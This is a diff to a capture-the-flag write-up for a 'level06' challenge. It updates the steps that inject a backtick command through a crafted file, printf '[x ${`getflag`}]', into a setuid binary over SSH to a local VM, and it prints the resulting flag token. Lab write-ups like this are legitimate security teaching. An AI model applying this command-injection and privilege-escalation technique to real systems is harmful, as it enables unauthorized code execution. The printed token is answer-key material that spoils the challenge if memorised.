@@ -54,10 +54,16 @@ printf '[x ${`getflag`}]\n' > /tmp/level06_exploit.txt
 - The captured group is passed to `y()` function
 - Function y() processes the output (replaces dots with " x ")
 
-#### Step 2: Execute Exploit via Setuid Binary
+#### Step 2: Execute Exploit via Setuid Binary and Capture Output
+Connect to the VM and execute the binary with the exploit file:
+
 ```bash
+sshpass -p "PASSWORD" ssh -o StrictHostKeyChecking=no -p 4242 level06@localhost << 'EXPLOIT'
+printf '[x ${`getflag`}]\n' > /tmp/level06_exploit.txt
 cd /home/user/level06
-./level06 /tmp/level06_exploit.txt 2>&1
+./level06 /tmp/level06_exploit.txt 2>&1 | tee /tmp/level06_output.txt
+cat /tmp/level06_output.txt
+EXPLOIT
 ```
 
 **Execution Flow:**
@@ -71,12 +77,16 @@ cd /home/user/level06
 #### Step 3: Extract Token from Output
 The output contains the flag token wrapped in the function's processing:
 
+```bash
+./level06 /tmp/level06_exploit.txt 2>&1 | grep "Check flag"
+```
+
+Output:
 ```
 Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 ```
 
-**Output Processing:**
-The y() function transforms dots to " x " in the output, so token will appear with spacing modifications.
+**Note:** The y() function transforms dots to " x " in the output, so the token may appear with spacing modifications in the function's output processing.
 
 ## Alternative Payloads
 
